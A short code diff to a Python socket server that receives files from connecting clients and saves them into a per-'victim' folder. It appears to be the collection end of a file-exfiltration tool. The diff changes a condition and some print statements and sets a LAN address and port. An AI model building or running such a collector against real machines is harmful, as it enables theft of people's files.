@@ -27,13 +27,13 @@ class Server(Protocol):
         folder = self.__open_victim_folder(addr)
         while connected:
             file_name, file_data = self.recv_file(conn)
-            if file_name and file_data:
+            if file_name :
                 file_name = file_name.decode()
-                print(file_name)
+                print('----------------------------------------')
+                print('getting...', file_name)
                 with open(f'{folder}/{file_name}', 'wb') as f:
                     f.write(file_data)
-                    print('----------------------------------------')
-                    print('getting...', file_name)
+
 
         conn.close()
 
@@ -52,4 +52,4 @@ class Server(Protocol):
 
 if __name__ == '__main__':
     print('SERVER IS STARTING :)')
-    Server(1, 1,'/Users/benalaluf/Desktop').start()
+    Server('192.168.1.133', 8830,'/Users/benalaluf/Desktop').start()
